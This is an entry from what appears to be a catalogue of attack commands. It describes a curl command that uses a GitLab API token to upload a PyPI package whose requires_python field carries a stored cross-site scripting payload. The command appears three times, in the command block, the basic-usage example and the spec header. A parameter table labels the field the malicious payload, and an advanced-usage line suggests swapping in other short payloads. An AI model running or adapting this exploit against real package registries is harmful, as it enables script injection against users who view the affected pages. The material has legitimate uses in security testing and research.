---
id: cmd-curl-pypi-xss
data: >-
  curl -v
  "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi"
  -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F
  name='package_test_1' -F requires_python='"><script>alert(1)</script>'
tags:
  - upload
  - xss
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:20.488Z'
verified: false
validated: true
submitted: true
---
# curl-upload-pypi-xss

## Command

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_test_1' -F requires_python='"><script>alert(1)</script>'
```

## Description

Uploads a PyPi package to GitLab via API, injecting an XSS payload into the requires_python field for stored XSS exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output for debugging | No |
| `https://__token__:$TOKEN@...` | Authenticated URL with project ID | Yes |
| `-F content=@/tmp/lala.txt` | Package file upload | Yes |
| `-F requires_python=2.7` | Initial Python req (overridden) | Yes |
| `-F version=1` | Package version | Yes |
| `-F name='package_test_1'` | Package name | Yes |
| `-F requires_python='...'` | Malicious payload override | Yes |

## Examples

### Basic Usage

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_test_1' -F requires_python='"><script>alert(1)</script>'
```

### Advanced Usage

Replace project ID and token; use different payload within 50 chars.

## Expected Output

HTTP/1.1 201 Created with JSON response including package details.

## Related

- [[commands/curl-upload-pypi-csp-v1]]
- [[procedures/Upload-Malicious-PyPi-Package-with-XSS-Payload]]
